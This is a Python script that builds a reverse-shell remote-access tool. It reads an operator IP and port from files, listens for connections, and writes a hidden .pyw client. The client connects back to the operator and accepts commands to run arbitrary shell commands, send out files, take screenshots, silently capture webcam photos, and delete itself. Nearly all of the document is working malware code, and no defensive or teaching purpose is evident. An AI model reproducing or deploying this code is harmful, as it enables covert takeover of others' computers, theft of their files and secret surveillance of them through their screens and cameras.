import socket
import os

conf = open('ReverseSet\\ip.txt', 'r')
ip = conf.read()
conf.close()

conf = open('ReverseSet\\port.txt', 'r')
port = conf.read()
conf.close()

def openConnection(port):
	server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	server.bind(('', port))

	server.listen()
	conn, addr = server.accept()

	return conn, addr

def buildReverse(host=ip, port=port):
	build = open('ReverseShell\\Rev.pyw', 'w')
	build.write(f'''
from pyautogui import screenshot
import socket
import os
import cv2

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(('{host}', {port}))

while True:
	data = client.recv(4096).decode()

	if data[0:5] == 'shell'.lower():
		execResp =  os.popen(data[6:]).read()
		client.send(bytes(execResp, encoding='utf-8'))
		data = ''


	elif data[0:8] == 'download'.lower():
		filename = os.path.basename(data[9:])
		fil = open(data[9:], 'r')
		uplod = fil.read()
		fil.close()

		client.send(bytes(uplod, encoding='utf-8'))
		client.send(bytes(filename, encoding='utf-8'))
		data = ''

	elif data == 'screenshot'.lower():
		img = screenshot('screen.png')

		sendt = open('screen.png', 'rb')
		datsend = sendt.read()
		sendt.close()

		client.send(datsend)

		os.system('del screen.png')

	elif data == 'photo'.lower():
		cap = cv2.VideoCapture(0)

		for i in range(30):
			cap.read()

		ret, frame = cap.read()

		cv2.imwrite('phot.png', frame)

		cap.release()

		phot = open('phot.png', 'rb')
		datasend = phot.read()
		phot.close()

		client.send(datasend)
		os.system('del phot.png')

	elif data == 'disconnect_&_delete'.lower():
		os.system('del Rev.pyw')
		break 
''')

	
	